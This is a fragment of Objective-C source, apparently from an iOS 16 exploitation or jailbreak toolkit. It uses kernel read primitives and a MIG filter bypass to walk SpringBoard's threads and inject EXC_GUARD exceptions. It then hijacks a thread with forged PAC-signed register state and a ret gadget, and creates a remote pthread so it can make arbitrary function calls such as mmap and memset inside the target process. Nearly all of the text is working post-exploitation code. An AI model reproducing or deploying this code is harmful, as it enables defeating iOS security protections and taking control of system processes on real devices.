    uint32_t taskThreadsHeadOffset = rc_ios16_task_threads_head_offset();
    uint64_t firstEntry = ds_kread64(_taskAddr + taskThreadsHeadOffset);
    uint64_t firstThread = rc_resolve_task_thread_entry(firstEntry, _taskAddr);
    uint64_t currThread = firstThread;
    RC_IOS16_DEBUG_LOG("(rc.iOS16) %s task_threads.next=0x%llx thread_ro=0x%llx proc=0x%llx task=0x%llx expected_task=0x%llx head_off=0x%x runtime_head_off=0x%x\n",
           process, firstEntry, firstThread ? thread_get_t_tro(firstThread) : 0, procAddr, _taskAddr, _taskAddr,
           taskThreadsHeadOffset, off_task_threads_next);
    RC_IOS16_DEBUG_LOG("(rc.iOS16) %s target success threads=%d\n", process, targetSuccessThreadCount);
    fflush(stdout);
    if (!firstThread) {
        [self destroyRemoteCall];
        return -1;
    }

    _trojanThreadAddr = 0;
    if (useMigFilterBypass) {
        mig_bypass_resume();
    }

    if (useSpringBoardActiveScan) {
        int maxRounds = (RC_IOS16_ACTIVE_SCAN_SECONDS * 1000000) / RC_IOS16_ACTIVE_SCAN_INTERVAL_US;
        uint64_t activeThread = 0;
        BOOL activeThreadInjected = NO;

        RC_IOS16_DEBUG_LOG("(rc.iOS16) SpringBoard active-scan begin seconds=%d interval_us=%d rounds=%d\n",
               RC_IOS16_ACTIVE_SCAN_SECONDS, RC_IOS16_ACTIVE_SCAN_INTERVAL_US, maxRounds);
        fflush(stdout);

        for (int round = 0; round < maxRounds && !activeThread; round++) {
            rc_ios16_poke_first_exception_target(process, round);
            uint64_t scanEntry = ds_kread64(_taskAddr + taskThreadsHeadOffset);
            uint64_t scanThread = rc_resolve_task_thread_entry(scanEntry, _taskAddr);
            int scanned = 0;

            while (scanThread && scanned < RC_IOS16_MAX_THREAD_CANDIDATES) {
                uint64_t scanTask = thread_get_task(scanThread);
                if (scanTask != _taskAddr) {
                    break;
                }

                uint64_t scanCpuData = rc_ios16_thread_cpu_datap(scanThread);
                uint64_t scanActive = scanCpuData ? ds_kread64(scanCpuData + RC_IOS16_OFF_CPU_ACTIVE_THREAD) : 0;
                if (scanCpuData && rc_kernel_ptr_matches(scanActive, scanThread)) {
                    uint64_t scanKstack = thread_get_kstackptr(scanThread);
                    if (!scanKstack) {
                        RC_IOS16_DEBUG_LOG("(rc.iOS16) SpringBoard active-scan skip active thread with zero kstack round=%d scanned=%d thread=0x%llx cpuData=0x%llx active=0x%llx\n",
                               round, scanned, scanThread, scanCpuData, scanActive);
                        fflush(stdout);
                        uint64_t next = ds_kread64(scanThread + rc_thread_task_threads_offset());
                        if (rc_ios16_is_task_thread_head(next, _taskAddr)) {
                            break;
                        }
                        scanThread = rc_resolve_task_thread_entry(next, _taskAddr);
                        scanned++;
                        continue;
                    }
                    activeThread = scanThread;
                    if ([_threadList containsObject:@(activeThread)]) {
                        uint64_t next = ds_kread64(scanThread + rc_thread_task_threads_offset());
                        if (rc_ios16_is_task_thread_head(next, _taskAddr)) {
                            break;
                        }
                        scanThread = rc_resolve_task_thread_entry(next, _taskAddr);
                        activeThread = 0;
                        scanned++;
                        continue;
                    }
                    RC_IOS16_DEBUG_LOG("(rc.iOS16) SpringBoard active-scan HIT round=%d scanned=%d thread=0x%llx cpuData=0x%llx active=0x%llx\n",
                           round, scanned, activeThread, scanCpuData, scanActive);
                    rc_ios16_log_thread_machine_probe(activeThread, "active-scan-hit");
                    fflush(stdout);
                    uint64_t recheckCpuData = rc_ios16_thread_cpu_datap(activeThread);
                    uint64_t recheckActive = recheckCpuData ? ds_kread64(recheckCpuData + RC_IOS16_OFF_CPU_ACTIVE_THREAD) : 0;
                    uint64_t recheckKstack = thread_get_kstackptr(activeThread);
                    if (!recheckCpuData || !rc_kernel_ptr_matches(recheckActive, activeThread) || !recheckKstack) {
                        RC_IOS16_DEBUG_LOG("(rc.iOS16) SpringBoard active-scan stale HIT before setExceptionPort round=%d scanned=%d thread=0x%llx cpuData=0x%llx active=0x%llx kstack=0x%llx; keep scanning\n",
                               round, scanned, activeThread, recheckCpuData, recheckActive, recheckKstack);
                        fflush(stdout);
                        activeThread = 0;
                        uint64_t next = ds_kread64(scanThread + rc_thread_task_threads_offset());
                        if (rc_ios16_is_task_thread_head(next, _taskAddr)) {
                            break;
                        }
                        scanThread = rc_resolve_task_thread_entry(next, _taskAddr);
                        scanned++;
                        continue;
                    }
                    RC_IOS16_DEBUG_LOG("(rc.iOS16) SpringBoard active-scan setExceptionPort begin thread=0x%llx port=0x%x\n",
                           activeThread, firstExceptionPort);
                    fflush(stdout);
                    BOOL activeSetPortOK = [self setExceptionPortOnThread:firstExceptionPort forThread:activeThread useMigFilterBypass:useMigFilterBypass];
                    RC_IOS16_DEBUG_LOG("(rc.iOS16) SpringBoard active-scan setExceptionPort result=%d thread=0x%llx\n",
                           activeSetPortOK, activeThread);
                    fflush(stdout);
                    if (!activeSetPortOK) {
                        RC_IOS16_DEBUG_LOG("(rc.iOS16) SpringBoard active-scan setExceptionPort failed thread=0x%llx; keep scanning\n",
                               activeThread);
                        fflush(stdout);
                        self.lastError = [NSString stringWithFormat:@"iOS16 SpringBoard active-scan setExceptionPort failed thread=0x%llx", activeThread];
                        activeThread = 0;
                    } else {
                        RC_IOS16_DEBUG_LOG("(rc.iOS16) SpringBoard active-scan immediate inject after setExceptionPort thread=0x%llx\n",
                               activeThread);
                        fflush(stdout);
                        rc_ios16_log_guard_target("before-active-scan-inject", activeThread, firstPortAddr);
                        RC_IOS16_DEBUG_LOG("(rc.iOS16) SpringBoard active-scan injectguardexc begin thread=0x%llx guard=0x%llx\n",
                               activeThread, guardCode);
                        fflush(stdout);
                        BOOL activeInjectOK = injectguardexc(activeThread, guardCode);
                        RC_IOS16_DEBUG_LOG("(rc.iOS16) SpringBoard active-scan injectguardexc result=%d thread=0x%llx\n",
                               activeInjectOK, activeThread);
                        fflush(stdout);
                        if (!activeInjectOK) {
                            RC_IOS16_DEBUG_LOG("(rc.iOS16) SpringBoard active-scan Inject EXC_GUARD failed thread=0x%llx; keep scanning\n",
                                   activeThread);
                            fflush(stdout);
                            activeThread = 0;
                        } else {
                            _trojanThreadAddr = activeThread;
                            g_rc_ios16_last_active_injected_thread = activeThread;
                            successThreadCount++;
                            [_threadList addObject:@(activeThread)];
                            activeThreadInjected = YES;
                            RC_IOS16_DEBUG_LOG("(rc.iOS16) SpringBoard active-scan Inject EXC_GUARD on thread:0x%llx OK\n",
                                   activeThread);
                            rc_ios16_log_guard_target("after-active-scan-inject", activeThread, firstPortAddr);
                            rc_ios16_propagate_guard_ast_to_cpu(activeThread, "active-scan");
                            rc_ios16_wait_guard_ast_changed(activeThread);
                            rc_ios16_log_guard_target("after-active-scan-500ms", activeThread, firstPortAddr);
                        }
                    }
                    break;
                }

                uint64_t next = ds_kread64(scanThread + rc_thread_task_threads_offset());
                if (rc_ios16_is_task_thread_head(next, _taskAddr)) {
                    break;
                }
                scanThread = rc_resolve_task_thread_entry(next, _taskAddr);
                scanned++;
            }

            if (!activeThread) {
                if ((round % 20) == 0) {
                    RC_IOS16_DEBUG_LOG("(rc.iOS16) SpringBoard active-scan round=%d/%d no-active scanned=%d\n",
                           round + 1, maxRounds, scanned);
                    fflush(stdout);
                }
                usleep(RC_IOS16_ACTIVE_SCAN_INTERVAL_US);
            }
        }

        if (!activeThreadInjected) {
            RC_IOS16_DEBUG_LOG("(rc.iOS16) SpringBoard active-scan no injectable active thread after %d seconds; activeThread=0x%llx threadList=%lu success=%d; aborting before inactive fallback\n",
                   RC_IOS16_ACTIVE_SCAN_SECONDS,
                   activeThread,
                   (unsigned long)_threadList.count,
                   successThreadCount);
            fflush(stdout);
            self.lastError = [NSString stringWithFormat:@"iOS16 SpringBoard active-scan found no injectable active thread after %d seconds", RC_IOS16_ACTIVE_SCAN_SECONDS];
            if (useMigFilterBypass) {
                mig_bypass_pause();
            }
            [self destroyRemoteCall];
            return -1;
        }

        currThread = activeThread;
        firstThread = activeThread;
        validThreadCount = 0;
        retryCount = 0;
        RC_IOS16_DEBUG_LOG("(rc.iOS16) SpringBoard active-scan selected injected thread=0x%llx\n",
               activeThread);
        fflush(stdout);
    }

    while (currThread && successThreadCount < targetSuccessThreadCount && validThreadCount < RC_IOS16_MAX_THREAD_CANDIDATES && retryCount < 3) {
        uint64_t task = thread_get_task(currThread);
        if (!task) {
            if (!validThreadCount) {
                printf("(rc) failed on getting first thread at all, resetting\n");
                firstEntry = ds_kread64(_taskAddr + taskThreadsHeadOffset);
                firstThread = rc_resolve_task_thread_entry(firstEntry, _taskAddr);
                currThread = firstThread;
                retryCount++;
                continue;
            }
            break;
        }

        if (task == _taskAddr) {
            rc_ios16_log_thread_machine_probe(currThread, "candidate");
            uint64_t candidateKstack = thread_get_kstackptr(currThread);
            uint64_t candidateCpuData = rc_ios16_thread_cpu_datap(currThread);
            uint64_t candidateActive = candidateCpuData ? ds_kread64(candidateCpuData + RC_IOS16_OFF_CPU_ACTIVE_THREAD) : 0;
            RC_IOS16_DEBUG_LOG("(rc.iOS16) candidate thread=0x%llx kstack=0x%llx cpuData=0x%llx active=0x%llx\n",
                   currThread, candidateKstack, candidateCpuData, candidateActive);
            fflush(stdout);
            if (!candidateCpuData || !rc_kernel_ptr_matches(candidateActive, currThread)) {
                if (allowInactiveFallback && (!inactiveFallbackThread || (!inactiveFallbackKstack && candidateKstack))) {
                    inactiveFallbackThread = currThread;
                    inactiveFallbackKstack = candidateKstack;
                    RC_IOS16_DEBUG_LOG("(rc.iOS16) remember inactive fallback thread=0x%llx kstack=0x%llx cpuData=0x%llx active=0x%llx\n",
                           inactiveFallbackThread, inactiveFallbackKstack, candidateCpuData, candidateActive);
                    fflush(stdout);
                }
                RC_IOS16_DEBUG_LOG("(rc.iOS16) accept inactive candidate lara-style: current=0x%llx kstack=0x%llx cpuData=0x%llx active=0x%llx\n",
                       currThread, candidateKstack, candidateCpuData, candidateActive);
                fflush(stdout);
            }

            if (![self setExceptionPortOnThread:firstExceptionPort forThread:currThread useMigFilterBypass:useMigFilterBypass]) {
                printf("(rc) Set exception port on thread:0x%llx failed\n", (unsigned long long)currThread);
                if (successThreadCount > 0) {
                    RC_IOS16_DEBUG_LOG("(rc.iOS16) set_exception failed after injected threads=%d; stop scanning and wait for first exception\n",
                           successThreadCount);
                    fflush(stdout);
                    break;
                }
                uint64_t next = ds_kread64(currThread + rc_thread_task_threads_offset());
                RC_IOS16_DEBUG_LOG("(rc.iOS16) advancing to next thread entry after set_exception failure: current=0x%llx next=0x%llx\n", currThread, next);
                if (rc_ios16_is_task_thread_head(next, _taskAddr)) {
                    RC_IOS16_DEBUG_LOG("(rc.iOS16) stop scanning after set_exception failure at task thread queue head\n");
                    fflush(stdout);
                    break;
                }
                currThread = rc_resolve_task_thread_entry(next, _taskAddr);
                if (!currThread) {
                    break;
                }
                retryCount++;
                continue;
            }

            rc_ios16_log_guard_target("before-inject", currThread, firstPortAddr);
            if (!injectguardexc(currThread, guardCode)) {
                printf("(rc) Inject EXC_GUARD on thread:0x%llx failed, not injecting\n", (unsigned long long)currThread);
                if (successThreadCount > 0) {
                    RC_IOS16_DEBUG_LOG("(rc.iOS16) guard injection failed after injected threads=%d; stop scanning and wait for first exception\n",
                           successThreadCount);
                    fflush(stdout);
                    break;
                }
                uint64_t next = ds_kread64(currThread + rc_thread_task_threads_offset());
                RC_IOS16_DEBUG_LOG("(rc.iOS16) advancing to next thread entry after guard injection failure: current=0x%llx next=0x%llx\n", currThread, next);
                if (rc_ios16_is_task_thread_head(next, _taskAddr)) {
                    RC_IOS16_DEBUG_LOG("(rc.iOS16) stop scanning after guard injection failure at task thread queue head\n");
                    fflush(stdout);
                    break;
                }
                currThread = rc_resolve_task_thread_entry(next, _taskAddr);
                if (!currThread) {
                    break;
                }
                retryCount++;
                continue;
            }

            _trojanThreadAddr = currThread;
            successThreadCount++;
            [_threadList addObject:@(currThread)];
            printf("(rc) Inject EXC_GUARD on thread:0x%llx OK\n", (unsigned long long)currThread);
            rc_ios16_log_guard_target("after-inject", currThread, firstPortAddr);
            rc_ios16_propagate_guard_ast_to_cpu(currThread, "after-inject");
            rc_ios16_wait_guard_ast_changed(currThread);
            rc_ios16_log_guard_target("after-500ms", currThread, firstPortAddr);
            validThreadCount++;
        } else if (task && !validThreadCount) {
            printf("(rc) Got weird tro on first thread, resetting\n");
            firstEntry = ds_kread64(_taskAddr + taskThreadsHeadOffset);
            currThread = rc_resolve_task_thread_entry(firstEntry, _taskAddr);
            retryCount++;
            continue;
        }

        uint64_t nextEntry = ds_kread64(currThread + rc_thread_task_threads_offset());
        if (!nextEntry) {
            if (!validThreadCount) {
                printf("(rc) Got empty next thread. Retry\n");
                firstEntry = ds_kread64(_taskAddr + taskThreadsHeadOffset);
                currThread = rc_resolve_task_thread_entry(firstEntry, _taskAddr);
                retryCount++;
                continue;
            }
            printf("(rc) Break because of empty next thread\n");
            break;
        }
        if (rc_ios16_is_task_thread_head(nextEntry, _taskAddr)) {
            RC_IOS16_DEBUG_LOG("(rc.iOS16) reached task thread queue head after current=0x%llx; stop scanning\n", currThread);
            fflush(stdout);
            break;
        }
        currThread = rc_resolve_task_thread_entry(nextEntry, _taskAddr);
        if (!currThread) {
            break;
        }
    }

    if (successThreadCount == 0 && inactiveFallbackThread) {
        RC_IOS16_DEBUG_LOG("(rc.iOS16) trying inactive fallback thread=0x%llx kstack=0x%llx\n",
               inactiveFallbackThread, inactiveFallbackKstack);
        fflush(stdout);

        if ([self setExceptionPortOnThread:firstExceptionPort forThread:inactiveFallbackThread useMigFilterBypass:useMigFilterBypass]) {
            rc_ios16_log_guard_target("before-inactive-fallback-inject", inactiveFallbackThread, firstPortAddr);
            if (injectguardexc(inactiveFallbackThread, guardCode)) {
                _trojanThreadAddr = inactiveFallbackThread;
                successThreadCount++;
                [_threadList addObject:@(inactiveFallbackThread)];
                RC_IOS16_DEBUG_LOG("(rc.iOS16) inactive fallback Inject EXC_GUARD on thread:0x%llx OK\n",
                       inactiveFallbackThread);
                rc_ios16_log_guard_target("after-inactive-fallback-inject", inactiveFallbackThread, firstPortAddr);
                rc_ios16_propagate_guard_ast_to_cpu(inactiveFallbackThread, "inactive-fallback");
                rc_ios16_wait_guard_ast_changed(inactiveFallbackThread);
                rc_ios16_log_guard_target("after-inactive-fallback-500ms", inactiveFallbackThread, firstPortAddr);
            } else {
                RC_IOS16_DEBUG_LOG("(rc.iOS16) inactive fallback Inject EXC_GUARD on thread:0x%llx failed\n",
                       inactiveFallbackThread);
            }
        } else {
            RC_IOS16_DEBUG_LOG("(rc.iOS16) inactive fallback setExceptionPort failed thread=0x%llx\n",
                   inactiveFallbackThread);
        }
        fflush(stdout);
    }

    if (useMigFilterBypass) {
        mig_bypass_pause();
    }

    RC_IOS16_DEBUG_LOG("(rc.iOS16) %s first-exception target threads=%d max_valid=%d\n", process, successThreadCount, RC_IOS16_MAX_THREAD_CANDIDATES);
    printf("(rc) Valid threads: %d\n", validThreadCount);
    printf("(rc) Injected threads: %d\n", successThreadCount);
    fflush(stdout);

    if (_threadList.count == 0) {
        printf("(rc) Exception injection failed. Aborting.\n");
        [self destroyRemoteCall];
        return -1;
    }

    excmsg exc;
    g_rc_ios16_last_active_injected_thread = 0;
    if (!rc_ios16_wait_first_exception(firstExceptionPort, &exc, process, _threadList)) {
        printf("(rc) Failed to receive first exception\n");
        for (NSNumber *thread in _threadList) {
            rc_ios16_log_guard_target("before-timeout-clear", thread.unsignedLongLongValue, firstPortAddr);
            printf("(rc) Clearing pending EXC_GUARD after first-exception timeout: 0x%llx\n", thread.unsignedLongLongValue);
            rc_ios16_clear_guard_ast_from_cpu(thread.unsignedLongLongValue, "timeout");
            clearguardexc(thread.unsignedLongLongValue);
        }
        [self destroyRemoteCall];
        return -1;
    }

    if (g_rc_ios16_last_active_injected_thread) {
        BOOL observedThreadWasInjected = NO;
        for (NSNumber *threadValue in _threadList) {
            if (rc_kernel_ptr_matches(threadValue.unsignedLongLongValue, g_rc_ios16_last_active_injected_thread)) {
                observedThreadWasInjected = YES;
                break;
            }
        }
        if (observedThreadWasInjected && !rc_kernel_ptr_matches(_trojanThreadAddr, g_rc_ios16_last_active_injected_thread)) {
            RC_IOS16_DEBUG_LOG("(rc.iOS16) first exception attributed to active thread: old_trojan=0x%llx active=0x%llx\n",
                   _trojanThreadAddr, g_rc_ios16_last_active_injected_thread);
            fflush(stdout);
            _trojanThreadAddr = g_rc_ios16_last_active_injected_thread;
        }
    }

    memcpy(&_originalState, &exc.threadState, sizeof(arm_thread_state64_internal));
    if (g_rc_ios16_first_landing_pacia_enabled) {
        NSMutableString *paciaResult = g_rc_ios16_first_landing_pacia_result;
        if (paciaResult) {
            [paciaResult appendFormat:@"process=%s task=0x%llx first_port=0x%x first_port_obj=0x%llx trojan_thread=0x%llx thread_count=%lu\n",
             process,
             _taskAddr,
             firstExceptionPort,
             firstPortAddr,
             _trojanThreadAddr,
            (unsigned long)_threadList.count];
            rc_append_exception_state_inventory(paciaResult, "first-exception", &exc, _trojanThreadAddr, firstPortAddr);
            BOOL ok = [self runFirstLandingPaciaProbeWithResult:paciaResult exceptionPort:firstExceptionPort exception:&exc thread:_trojanThreadAddr firstPortAddr:firstPortAddr];
            [paciaResult appendFormat:@"probe_result=%d\n", ok];
        } else {
            statereply(&exc, &exc.threadState);
        }
        [self destroyRemoteCall];
        return 0;
    }
    if (g_rc_ios16_first_landing_inventory_enabled) {
        NSMutableString *inventory = g_rc_ios16_first_landing_inventory_result;
        if (inventory) {
            [inventory appendFormat:@"process=%s task=0x%llx first_port=0x%x first_port_obj=0x%llx trojan_thread=0x%llx thread_count=%lu\n",
             process,
             _taskAddr,
             firstExceptionPort,
             firstPortAddr,
             _trojanThreadAddr,
             (unsigned long)_threadList.count];
            rc_append_exception_state_inventory(inventory, "first-exception", &exc, _trojanThreadAddr, firstPortAddr);
        }
        for (NSNumber *thread in _threadList) {
            rc_ios16_clear_guard_ast_from_cpu(thread.unsignedLongLongValue, "first-landing-inventory");
            clearguardexc(thread.unsignedLongLongValue);
        }
        BOOL replied = statereply(&exc, &exc.threadState);
        if (inventory) {
            [inventory appendFormat:@"reply_original_state=%d\n", replied];
        }
        [self destroyRemoteCall];
        return replied ? 0 : -1;
    }
    for (NSNumber *thread in _threadList) {
        rc_ios16_clear_guard_ast_from_cpu(thread.unsignedLongLongValue, "success");
        clearguardexc(thread.unsignedLongLongValue);
    }
    printf("(rc) Finish clearing EXC_GUARD from all other threads...\n");

    excmsg exc2;
    int desiredTimeout = 1500;
    while (waitexc(firstExceptionPort, &exc2, desiredTimeout, false)) {
        statereply(&exc2, &exc2.threadState);
    }

    uint64_t trojanMemTemp = ((uint64_t)exc.threadState.__sp & 0x7fffffffffULL) - 0x4000ULL;
    printf("(rc) trojanMemTemp: 0x%llx\n", trojanMemTemp);
    fflush(stdout);

    _vmMap = task_get_vm_map(_taskAddr);
    printf("(rc) vmMap: 0x%llx\n", _vmMap);
    fflush(stdout);

    uint64_t firstThreadParkTrap = FAKE_PC_TROJAN_CREATOR;
    _firstThreadReturnTrap = FAKE_LR_TROJAN_CREATOR;
    _secondThreadReturnTrap = FAKE_LR_TROJAN;
    _originalThreadNeedsRestore = true;

    arm_thread_state64_internal parkState = exc.threadState;
    [self signState:_trojanThreadAddr withState:&parkState pc:firstThreadParkTrap lr:_firstThreadReturnTrap];
    if (!statereply(&exc, &parkState)) {
        [self destroyRemoteCall];
        return -1;
    }

    rc_ios16_log_local_symbol_probe("getpid", (void *)getpid);
    rc_ios16_log_local_symbol_probe("pthread_create_suspended_np", (void *)pthread_create_suspended_np);
    rc_ios16_log_local_symbol_probe("pthread_create", (void *)pthread_create);
    rc_ios16_log_local_symbol_probe("pthread_mach_thread_np", (void *)pthread_mach_thread_np);

    uint64_t retGadget = rc_ios16_find_ret_gadget_near((void *)getpid);
    rc_ios16_log_local_symbol_probe("ret_gadget_near_getpid", (void *)(uintptr_t)retGadget);
    uint64_t retProbeArg = 0x123456789abcdef0ULL;
    uint64_t retProbeArgs[] = { retProbeArg };
    uint64_t retProbe = retGadget ? [self doRemoteCallTempWithTimeout:100
                                                          functionName:(char *)"ret_gadget"
                                                       functionPointer:(void *)retGadget
                                                                  args:retProbeArgs
                                                              argCount:1] : 0;
    RC_IOS16_DEBUG_LOG("(rc.iOS16) ret gadget probe addr=0x%llx arg=0x%llx ret=0x%llx\n",
           retGadget,
           retProbeArg,
           retProbe);
    fflush(stdout);
    if (retProbe != retProbeArg) {
        [self destroyRemoteCall];
        return -1;
    }

    uint64_t threadStartTrap = FAKE_PC_TROJAN;
    uint64_t remoteCrashSigned = remotepac(_trojanThreadAddr, threadStartTrap, 0);
    printf("(rc) remoteCrashSigned: 0x%llx\n", remoteCrashSigned);
    fflush(stdout);
    if (!remoteCrashSigned) {
        [self destroyRemoteCall];
        return -1;
    }

    uint64_t pthreadCreateCommon = rc_ios16_resolve_second_unconditional_branch_target("pthread_create_suspended_np", (void *)pthread_create_suspended_np);
    rc_ios16_log_local_symbol_probe("pthread_create_common_ios16", (void *)(uintptr_t)pthreadCreateCommon);
    if (!pthreadCreateCommon) {
        [self destroyRemoteCall];
        return -1;
    }

    uint64_t createThreadArgs[] = {
        trojanMemTemp,
        0,
        remoteCrashSigned,
        0,
        2,
    };
    RC_IOS16_DEBUG_LOG("(rc.iOS16) pthread_create_common temp-call begin func=0x%llx slot=0x%llx attr=0x0 start=0x%llx arg=0x0 flags=0x2 remoteCrashSigned=0x%llx\n",
           pthreadCreateCommon,
           trojanMemTemp,
           threadStartTrap,
           remoteCrashSigned);
    fflush(stdout);
    uint64_t createThreadRet = [self doRemoteCallTempWithTimeout:100
                                                    functionName:(char *)"pthread_create_common_ios16"
                                                 functionPointer:(void *)(uintptr_t)pthreadCreateCommon
                                                            args:createThreadArgs
                                                        argCount:5];
    RC_IOS16_DEBUG_LOG("(rc.iOS16) pthread_create_common temp-call end ret=0x%llx\n", createThreadRet);
    fflush(stdout);
    printf("(rc) trojanMemTemp: 0x%llx\n", trojanMemTemp);
    uint64_t pthreadAddr = self[trojanMemTemp].value64;
    printf("(rc) pthreadAddr: 0x%llx\n", pthreadAddr);
    if (createThreadRet != 0 || !pthreadAddr) {
        if (strcmp(process, "SpringBoard") == 0) {
            RC_IOS16_DEBUG_LOG("(rc.iOS16) pthread_create_suspended_np did not produce a pthread for SpringBoard; treating init as failed to avoid fake success\n");
            fflush(stdout);
            self.lastError = @"iOS16 SpringBoard RemoteCall needs a working extra thread; pthread_create_suspended_np returned no pthread";
            [self destroyRemoteCall];
            return -1;
        }
        RC_IOS16_DEBUG_LOG("(rc.iOS16) pthread_create_suspended_np unavailable through temp RC; falling back to original thread only\n");
        fflush(stdout);
        _creatingExtraThread = false;
        goto ios16_no_extra_thread;
    }

    uint64_t callThreadPort = RemoteArbCallTempWithTimeout(100, self, pthread_mach_thread_np, pthreadAddr);
    printf("(rc) callThreadPort: 0x%llx\n", callThreadPort);
    if (!callThreadPort) {
        [self destroyRemoteCall];
        return -1;
    }
    _callThreadAddr = rc_task_get_ipc_port_kobject(_taskAddr, (mach_port_t)callThreadPort);
    if (!_callThreadAddr) {
        [self destroyRemoteCall];
        return -1;
    }

    if (useMigFilterBypass) {
        mig_bypass_resume();
    }
    if (![self setExceptionPortOnThread:secondExceptionPort forThread:_callThreadAddr useMigFilterBypass:useMigFilterBypass]) {
        if (useMigFilterBypass) {
            mig_bypass_pause();
        }
        [self destroyRemoteCall];
        return -1;
    }
    if (useMigFilterBypass) {
        mig_bypass_pause();
    }

    printf("(rc) All good! Resuming trojan thread...\n");
    RemoteArbCallTempWithTimeout(100, self, thread_resume, callThreadPort);
    RC_IOS16_DEBUG_LOG("(rc.iOS16) thread_resume returned to trap; treating new thread as resumed\n");
    _creatingExtraThread = true;

    if (_creatingExtraThread) {
        printf("(rc) New thread created, resuming original\n");
        [self restoreTrojanThreadWithState:&_originalState];
        _trojanThreadAddr = _callThreadAddr;
    }

ios16_no_extra_thread:
    RC_IOS16_DEBUG_LOG("(rc.iOS16) Continuing with original thread as temp caller\n");

    _pid = (int)ds_kread32(procAddr + off_proc_p_pid);
    printf("(rc) Task pid: %d\n", _pid);
    if (_pid <= 0) {
        [self destroyRemoteCall];
        return -1;
    }

    if (!_creatingExtraThread) {
        _trojanMem = trojanMemTemp;
        _trojanMemIsStackFallback = true;
        _trojanMemScratchOffset = 0;
        uint8_t *zeroPage = calloc(1, PAGE_SIZE);
        BOOL clearedStackScratch = zeroPage && [self remote_write:_trojanMem from:zeroPage size:PAGE_SIZE];
        free(zeroPage);
        RC_IOS16_DEBUG_LOG("(rc.iOS16) using stack fallback trojanMem=0x%llx clear=%d\n",
               _trojanMem,
               clearedStackScratch);
        fflush(stdout);
        if (!clearedStackScratch) {
            _trojanMem = 0;
            _trojanMemIsStackFallback = false;
            _trojanMemScratchOffset = 0;
            [self destroyRemoteCall];
            return -1;
        }
    } else {
        _trojanMem = RemoteArbCallWithTimeout(100, self, mmap, 0, PAGE_SIZE, VM_PROT_READ | VM_PROT_WRITE, MAP_PRIVATE | MAP_ANON, (uint64_t)-1, 0);
        _trojanMemIsStackFallback = false;
        _trojanMemScratchOffset = 0;
    }
    if (!_trojanMem || _trojanMem == UINT64_MAX) {
        _trojanMem = 0;
        _trojanMemIsStackFallback = false;
        _trojanMemScratchOffset = 0;
        [self destroyRemoteCall];
        return -1;
    }

    if (!_trojanMemIsStackFallback) {
        RemoteArbCallWithTimeout(100, self, memset, _trojanMem, 0, PAGE_SIZE);
    }
    _success = true;
    printf("(rc) Finished successfully\n");
    return 0;
}

@end
